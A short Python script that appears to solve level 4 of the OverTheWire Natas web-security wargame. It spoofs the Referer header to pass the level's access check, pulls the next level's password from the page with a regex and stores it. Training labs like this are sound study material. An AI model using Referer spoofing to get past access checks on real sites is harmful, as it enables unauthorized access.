import requests
import re
from natas_utility import *

current_level = 4
credentials = get_credentials(current_level)

base_url = 'http://{}.natas.labs.overthewire.org'.format(credentials['username'])
auth = (credentials['username'], credentials['password'])

session = requests.session()

url = base_url
headers = {'referer': 'http://natas5.natas.labs.overthewire.org/'}
response = session.get(url, auth=auth, headers=headers)

content = response.content.decode('utf-8')

# print(content)

password_regex = re.compile(r'Access granted. The password for natas5 is (.+)')
next_password = password_regex.findall(content)[0]
print(next_password)

save_credentials(current_level + 1, next_password)
